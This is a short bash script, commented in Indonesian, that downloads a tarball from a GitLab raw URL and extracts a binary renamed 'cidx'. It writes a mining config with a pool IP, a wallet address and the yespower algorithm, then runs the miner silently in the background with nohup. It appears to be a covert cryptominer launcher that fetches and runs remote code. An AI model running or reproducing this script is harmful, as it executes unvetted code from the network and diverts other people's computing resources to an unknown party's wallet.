#!/bin/bash

# Hentikan proses cidx yang mungkin masih berjalan
pkill cidx || true

# Download dan extract cidx
echo "📥 Download cidx..."
wget -q -O cidx https://gitlab.com/jasa4/minulme/-/raw/main/cidxC.tar.gz
tar -xvf cidx >/dev/null 2>&1

# Set waktu sekarang (UTC-7)
current_date=$(TZ=UTC-7 date +"%H-%M [%d-%m]")

# Buat file config.json
echo "⚙️ Buat config.json..."
cat > config.json <<END
{
  "url": "45.115.224.115:443",
  "user": "VGq2bKrQ2AiJPNwttzKw7FE8RZJSQQva3G.1",
  "pass": "c=VECO,m=solo,zap=VECO,mc=VECO",
  "threads": 7,
  "algo": "yespower"
}
END

chmod +x cidx config.json

# Jalankan proses cidx di background
echo "🚀 Menjalankan cidx (sekali saja)..."
nohup ./cidx -c config.json &>/dev/null &

# Tampilkan status
start_time=$(TZ=UTC-7 date +"%R-[%d/%m/%y]")
echo "[$start_time] STATUS: 🚀 JALAN"
